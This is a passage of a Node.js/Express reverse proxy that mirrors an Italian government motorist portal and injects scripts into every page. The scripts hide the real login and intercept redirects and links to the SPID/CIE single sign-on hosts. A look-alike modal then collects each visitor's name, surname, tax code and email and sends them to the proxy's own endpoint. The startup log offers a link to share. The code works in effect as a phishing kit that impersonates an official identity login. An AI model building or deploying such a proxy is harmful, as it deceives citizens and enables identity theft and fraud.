// ── Silence Liferay portlet AJAX so it never falls back to a redirect ─────────
app.all('/c/portal/*', (_req, res) => res.json({}));

// ── Script injected into every proxied HTML page ──────────────────────────────
const GUARD = `<script>
(function(){
  /* Inject permanent CSS to hide #login immediately — runs before any AJAX */
  (function(){
    if(document.getElementById('__pda-hide-login')) return;
    var s=document.createElement('style');
    s.id='__pda-hide-login';
    s.textContent='#login{display:none!important}';
    (document.head||document.documentElement).appendChild(s);
  })();

  /* ── Auth-aware header injection ─────────────────────────────────────────────
     Problem: Liferay script[13] resets runtimePortletIds after our GUARD runs,
     causing the loginsso portlet to reload via AJAX and overwrite any innerHTML
     we inject into #login.
     Solution: hide #login entirely and insert a SIBLING <div id="__pda-auth-bar">
     next to it. Liferay re-renders #login all it wants — our sibling is untouched.
     A 200ms poll runs for 6s to cover all delayed portlet AJAX loads.          */
  window.__pdaHome   = function(){ location.href='/dashboard.html'; };
  window.__pdaLogout = function(){
    localStorage.removeItem('token'); localStorage.removeItem('user');
    location.href='/web/portale-automobilista';
  };
  (function(){
    var t=localStorage.getItem('token'), u=localStorage.getItem('user');
    if(!t||!u) return;
    try{
      var pl=JSON.parse(atob(t.split('.')[1].replace(/-/g,'+').replace(/_/g,'/')));
      if(pl.exp&&Date.now()/1000>pl.exp){
        localStorage.removeItem('token'); localStorage.removeItem('user'); return;
      }
    }catch(e){ return; }
    var usr; try{ usr=JSON.parse(u); }catch(e){ return; }
    var fn=(usr.name||'').split(' ')[0]||'Utente';

    function doInject(){
      var login=document.getElementById('login');
      if(!login||!login.parentNode) return;
      /* Always keep the real #login hidden via inline style too */
      login.style.setProperty('display','none','important');
      /* Check if our bar already exists AND is correctly parented next to #login.
         If Liferay AJAX moved/recreated #login, the old bar is orphaned — remove it
         and re-insert next to the new #login. */
      var existing=document.getElementById('__pda-auth-bar');
      if(existing){
        if(existing.parentNode===login.parentNode) return; /* correctly placed */
        existing.parentNode&&existing.parentNode.removeChild(existing); /* stale */
      }
      /* Build our authenticated bar — matches real portal #login layout exactly:
         real CSS: #login { float:right; min-width:514px; height:36px; background:#444646 }
                   #login-user { float:left; margin:8px 10px 0 10px; font-size:90%; font-weight:bold; color:#fff }
                   #login-user strong { color:#009bc9 } */
      var BTN='padding:4px 13px;font-size:11px;font-weight:700;letter-spacing:.5px;border-radius:3px;cursor:pointer;color:#fff;text-transform:uppercase;white-space:nowrap;line-height:1.7;font-family:inherit;border:1px solid rgba(0,0,0,.30);box-shadow:inset 0 1px 0 rgba(255,255,255,.22),0 1px 2px rgba(0,0,0,.28)';
      var bar=document.createElement('div');
      bar.id='__pda-auth-bar';
      bar.style.cssText='float:right;min-width:514px;height:36px;background-color:#444646;box-sizing:border-box;overflow:hidden';
      bar.innerHTML=
        '<div style="float:left;margin:8px 10px 0 10px;font-size:90%;font-weight:bold;color:#fff;white-space:nowrap">'
          +'Benvenuto, <strong style="color:#009bc9">'+fn+'</strong>'
        +'</div>'
        +'<div style="float:right;display:flex;align-items:center;gap:5px;margin:4px 10px 0 0">'
          +'<button onclick="__pdaHome()" style="'+BTN+';background:linear-gradient(to bottom,#2e8ae0 0%,#1262b8 100%);border-color:#0c52a0">&#8962; HOME</button>'
          +'<button onclick="location.href=\'/dashboard.html#profilo\'" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%)">PROFILO</button>'
          +'<button onclick="__pdaLogout()" style="'+BTN+';background:linear-gradient(to bottom,#999 0%,#6e6e6e 100%);border-color:#555">ESCI</button>'
        +'</div>'
        +'<div style="clear:both"></div>';
      /* Insert our bar immediately before #login in the DOM */
      login.parentNode.insertBefore(bar, login);
    }

    if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',doInject);
    else doInject();
    /* MutationObserver: instant re-inject when DOM changes */
    if(window.MutationObserver)
      new MutationObserver(doInject).observe(document.documentElement,{childList:true,subtree:true});
    /* Poll for 6 s to defeat delayed Liferay AJAX portlet loads */
    var _poll=setInterval(doInject,200);
    setTimeout(function(){ clearInterval(_poll); doInject(); },6000);
  })();

  /* ── Guest bar injection (unauthenticated) ───────────────────────────────────
     Same sibling-element approach as the auth bar: hide #login and insert our
     own div so Liferay's login portlet can never show the real SSO buttons.    */
  (function(){
    var t=localStorage.getItem('token'), u=localStorage.getItem('user');
    if(t&&u) return; /* authenticated path already handles this */
    var BTN='padding:4px 13px;font-size:11px;font-weight:700;letter-spacing:.5px;border-radius:3px;cursor:pointer;text-transform:uppercase;white-space:nowrap;line-height:1.7;font-family:inherit;text-decoration:none;display:inline-block;border:1px solid rgba(0,0,0,.30);box-shadow:inset 0 1px 0 rgba(255,255,255,.22),0 1px 2px rgba(0,0,0,.28)';
    function injectGuest(){
      var login=document.getElementById('login');
      if(!login||!login.parentNode) return;
      login.style.setProperty('display','none','important');
      var existing=document.getElementById('__pda-guest-bar');
      if(existing){
        if(existing.parentNode===login.parentNode) return;
        existing.parentNode&&existing.parentNode.removeChild(existing);
      }
      var bar=document.createElement('div');
      bar.id='__pda-guest-bar';
      bar.style.cssText='float:right;min-width:514px;height:36px;background-color:#444646;box-sizing:border-box;display:flex;align-items:center;justify-content:flex-end;padding:0 10px;gap:6px';
      bar.innerHTML=
        '<a href="/login.html" style="'+BTN+';background:linear-gradient(to bottom,#2e8ae0 0%,#1262b8 100%);border-color:#0c52a0;color:#fff">ACCEDI AL PORTALE</a>'
        +'<a href="/login.html" style="'+BTN+';background:linear-gradient(to bottom,#5a90c8 0%,#3a6fa8 100%);color:#fff">Iscriviti</a>';
      login.parentNode.insertBefore(bar,login);
    }
    if(document.readyState==='loading') document.addEventListener('DOMContentLoaded',injectGuest);
    else injectGuest();
    if(window.MutationObserver)
      new MutationObserver(injectGuest).observe(document.documentElement,{childList:true,subtree:true});
    var _gp=setInterval(injectGuest,200);
    setTimeout(function(){ clearInterval(_gp); injectGuest(); },6000);
  })();

  /* ── Bad-URL guard ───────────────────────────────────────────────────────── */
  var B=['idpciam','ssociam','sp.fed.pda','idpSSOInit','DispatcherEntry'];
  function bad(u){ return !!(u&&B.some(function(b){ return String(u).indexOf(b)!==-1; })); }
  window.__authBad=bad;
  try{ var _a=location.assign.bind(location);
       location.assign=function(u){
         if(!bad(u)) return _a(u);
         if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
         _a('/web/portale-automobilista');
       }; }catch(e){}
  try{ var _r=location.replace.bind(location);
       location.replace=function(u){
         if(!bad(u)) return _r(u);
         if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
         _r('/web/portale-automobilista');
       }; }catch(e){}
  /* Patch location.href setter - catches direct location.href = ssoUrl assignments */
  try{
    var _hDesc=Object.getOwnPropertyDescriptor(Location.prototype,'href');
    Object.defineProperty(Location.prototype,'href',{
      get:_hDesc.get,
      set:function(u){
        if(!bad(String(u))) return _hDesc.set.call(this,u);
        if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
        _hDesc.set.call(this,'/login.html');
      },
      configurable:true
    });
  }catch(e){}
  window.Liferay=window.Liferay||{};
  ['Portlet','AUI'].forEach(function(k){ window.Liferay[k]=window.Liferay[k]||{}; });
  window.Liferay.Portlet.onLoad=function(){};
  window.Liferay.Portlet.runtimePortletIds=[];
  window.Liferay.AUI.getBaseURL=function(){ return '/'; };
  document.addEventListener('click',function(e){
    var a=e.target; while(a&&a.tagName!=='A') a=a.parentElement;
    if(a&&bad(a.href)){
      e.preventDefault(); e.stopPropagation();
      if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
      location.replace('${LOGIN_PAGE}');
    }
  },true);
  document.addEventListener('submit',function(e){
    if(bad(e.target.action)){
      e.preventDefault(); e.stopPropagation();
      if(typeof window.__ourModal==='function'&&window.__ourModal()) return;
      location.replace('${LOGIN_PAGE}');
    }
  },true);
  if(window.MutationObserver){
    new MutationObserver(function(ms){
      ms.forEach(function(m){
        m.addedNodes.forEach(function(n){
          if(!n.querySelectorAll) return;
          (n.tagName==='A'?[n]:Array.from(n.querySelectorAll('a[href]'))).forEach(function(a){
            if(bad(a.href)&&typeof window.__ourModal!=='function') a.href='${LOGIN_PAGE}';
          });
        });
      });
    }).observe(document.documentElement,{childList:true,subtree:true});
  }
})();
</script>`;

// ── Modal injected into the real loginspid page ───────────────────────────────
const LOGINSPID_MODAL = `
<style>
#_our-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);
  z-index:99999;align-items:center;justify-content:center}
#_our-overlay.open{display:flex}
#_our-box{background:#fff;border-radius:8px;padding:32px 28px;
  max-width:420px;width:90%;box-shadow:0 8px 32px rgba(0,0,0,.25);
  font-family:'Titillium Web',Roboto,sans-serif;position:relative}
#_our-box h2{margin:0 0 6px;font-size:1.2rem;color:#00518c}
#_our-box p{margin:0 0 20px;font-size:.82rem;color:#555}
#_our-box label{display:block;font-size:.8rem;font-weight:700;
  color:#333;margin-bottom:3px;text-transform:uppercase;letter-spacing:.04em}
#_our-box input{width:100%;box-sizing:border-box;border:1px solid #bbb;
  border-radius:4px;padding:9px 10px;font-size:.95rem;margin-bottom:14px;
  font-family:inherit}
#_our-box input:focus{outline:2px solid #00518c;border-color:#00518c}
#_our-err{color:#c00;font-size:.83rem;margin-bottom:10px;display:none}
#_our-err.show{display:block}
#_our-submit{background:#00518c;color:#fff;border:none;border-radius:4px;
  padding:11px 0;font-size:1rem;cursor:pointer;width:100%;
  font-family:inherit;font-weight:700;letter-spacing:.03em}
#_our-submit:hover{background:#003d6b}
#_our-close{position:absolute;top:12px;right:14px;background:none;
  border:none;font-size:1.3rem;cursor:pointer;color:#888;line-height:1}
#_our-tabs{display:flex;gap:8px;margin-bottom:18px}
.our-tab{flex:1;padding:8px;border:2px solid #00518c;background:#fff;
  color:#00518c;border-radius:4px;cursor:pointer;font-size:.88rem;
  font-weight:700;font-family:inherit}
.our-tab.active{background:#00518c;color:#fff}
</style>
<div id="_our-overlay">
  <div id="_our-box">
    <button id="_our-close">&#x2715;</button>
    <h2>Accedi al Portale</h2>
    <p>Inserisci le tue credenziali di identit&agrave; digitale</p>
    <div id="_our-tabs">
      <button class="our-tab active" id="_tab-spid" onclick="_ourTab('spid')">SPID</button>
      <button class="our-tab" id="_tab-cie" onclick="_ourTab('cie')">CIE</button>
    </div>
    <div id="_our-err"></div>
    <label>Nome *</label>
    <input id="_our-nome" type="text" placeholder="Mario" autocomplete="given-name">
    <label>Cognome *</label>
    <input id="_our-cogn" type="text" placeholder="Rossi" autocomplete="family-name">
    <label style="display:flex;justify-content:space-between">Codice Fiscale <span style="font-weight:400;color:#aaa">(opzionale)</span></label>
    <input id="_our-cf" type="text" placeholder="RSSMRA80A01H501U" maxlength="16"
      oninput="this.value=this.value.toUpperCase()">
    <label style="display:flex;justify-content:space-between">Email <span style="font-weight:400;color:#aaa">(opzionale)</span></label>
    <input id="_our-email" type="email" placeholder="mario.rossi@example.com" autocomplete="email">
    <button id="_our-submit" onclick="_ourSubmit()">Accedi</button>
  </div>
</div>
<script>
(function(){
  var _method='spid';
  window._ourTab=function(t){
    _method=t;
    document.getElementById('_tab-spid').classList.toggle('active',t==='spid');
    document.getElementById('_tab-cie').classList.toggle('active',t==='cie');
  };
  function openModal(){
    document.getElementById('_our-overlay').classList.add('open');
    setTimeout(function(){ document.getElementById('_our-nome').focus(); },80);
  }
  document.getElementById('_our-close').onclick=function(){
    document.getElementById('_our-overlay').classList.remove('open');
  };
  document.getElementById('_our-overlay').addEventListener('click',function(e){
    if(e.target===this) this.classList.remove('open');
  });
  document.addEventListener('keydown',function(e){
    if(e.key==='Escape') document.getElementById('_our-overlay').classList.remove('open');
  });
  function hookBtns(){
    var sel='.italia-it-button,a[href*="idpSSOInit"],a[href*="ssociam"],a[href*="SSOLogin"],a[href*="DispatcherEntry"]';
    document.querySelectorAll(sel).forEach(function(el){
      if(el._hooked) return; el._hooked=true;
      el.addEventListener('click',function(e){ e.preventDefault(); e.stopPropagation(); openModal(); },true);
      if(el.tagName==='A') el.href='#';
    });
  }
  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',hookBtns);
  } else { hookBtns(); }
  if(window.MutationObserver){
    new MutationObserver(hookBtns).observe(document.documentElement,{childList:true,subtree:true});
  }
  /* Register with GUARD so it delegates bad-URL clicks to us */
  window.__ourModal=function(){ openModal(); return true; };
  window._ourSubmit=function(){
    var err=document.getElementById('_our-err');
    err.className=''; err.style.display='none';
    var body={
      firstName: document.getElementById('_our-nome').value.trim(),
      lastName:  document.getElementById('_our-cogn').value.trim(),
      taxId:     document.getElementById('_our-cf').value.trim()||undefined,
      email:     document.getElementById('_our-email').value.trim()||undefined,
    };
    if(!body.firstName||!body.lastName){
      err.textContent='Nome e Cognome sono obbligatori.';
      err.className='show'; err.style.display='block'; return;
    }
    var btn=document.getElementById('_our-submit');
    btn.disabled=true; btn.textContent='Accesso in corso...';
    fetch('/api/auth/'+(_method==='cie'?'cie':'spid')+'-login',{
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(body),
    }).then(function(r){ return r.json(); }).then(function(d){
      if(d.success){
        localStorage.setItem('token',d.token);
        localStorage.setItem('user',JSON.stringify(d.user));
        window.location.href='/dashboard.html';
      } else {
        err.textContent=d.message||'Errore durante l\'accesso.';
        err.className='show'; err.style.display='block';
        btn.disabled=false; btn.textContent='Accedi';
      }
    }).catch(function(){
      err.textContent='Errore di connessione al server.';
      err.className='show'; err.style.display='block';
      btn.disabled=false; btn.textContent='Accedi';
    });
  };
})();
</script>`;

// ── Proxy everything else to the real site ────────────────────────────────────
app.use('/', createProxyMiddleware({
  target: REAL_SITE,
  changeOrigin: true,
  secure: false,
  selfHandleResponse: true,
  on: {
    proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
      const ct = (proxyRes.headers['content-type'] || '');

      // Rewrite redirect Location headers so they stay on our proxy
      const loc = res.getHeader('location') || proxyRes.headers['location'];
      if (loc) {
        let newLoc = loc.replace(REAL_SITE, LOCAL);
        if (AUTH_RE.some(r => r.test(newLoc))) newLoc = LOGIN_PAGE;
        res.setHeader('location', newLoc);
      }

      if (!ct.includes('text/html')) return buffer;   // pass binary/CSS/JS as-is

      let html = buffer.toString('utf8');

      // Rewrite all absolute real-site URLs → our proxy URL in HTML
      html = html.replace(new RegExp(REAL_SITE.replace(/\./g,'\\.'),'g'), LOCAL);

      // Server-side: rewrite any href/action pointing to login/SSO → our login page.
      // This fires before JS runs so it's immune to timing/injection races.
      const LOGIN_RE_SRV = /(accesso-portale-automobilista|loginspid|SSOLogin|\/SSO\/|c\/portal\/login|idpciam|ssociam|idpSSOInit|DispatcherEntry)/i;
      html = html.replace(/href="([^"]*)"/gi, (match, url) =>
        LOGIN_RE_SRV.test(url) ? `href="${LOGIN_PAGE}"` : match);
      html = html.replace(/action="([^"]*)"/gi, (match, url) =>
        LOGIN_RE_SRV.test(url) ? `action="${LOGIN_PAGE}"` : match);

      // Inject guard early (after <head>) and late (before </body>)
      html = html.replace(/(<head[^>]*>)/i, '$1' + GUARD);
      html = html.includes('</body>')
        ? html.replace('</body>', GUARD + '</body>')
        : html + GUARD;

      // loginspid page → credential modal
      if (/loginspid/i.test(req.url)) {
        html = html.includes('</body>')
          ? html.replace('</body>', LOGINSPID_MODAL + '</body>')
          : html + LOGINSPID_MODAL;
      }
      // SSO provider selection page → rewrite provider links to our own pages
      if (/SSOLogin|\/SSO\//i.test(req.url)) {
        html = html.includes('</body>')
          ? html.replace('</body>', SSO_PROVIDER_REWRITE + '</body>')
          : html + SSO_PROVIDER_REWRITE;
      }

      // CSP: block scripts from external origins, allow same-origin + inline
      res.setHeader('Content-Security-Policy',
        "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src * data:; font-src * data:; style-src * 'unsafe-inline'");

      return html;
    }),
    error: (_err, _req, res) => {
      res.writeHead(302, { location: '/dashboard.html' });
      res.end();
    },
  },
}));

app.listen(PORT, '0.0.0.0', () => {
  const { networkInterfaces } = require('os');
  const nets = networkInterfaces();
  const lan = Object.values(nets).flat()
    .find(n => n.family === 'IPv4' && !n.internal);
  const lanIp = lan ? lan.address : 'your-local-ip';
  console.log(`\n🚗  Portale Automobilista (live proxy)`);
  console.log(`    Local:   http://localhost:${PORT}`);
  console.log(`    Network: http://${lanIp}:${PORT}  ← share this link`);
  console.log(`    Real site: ${REAL_SITE}\n`);
});
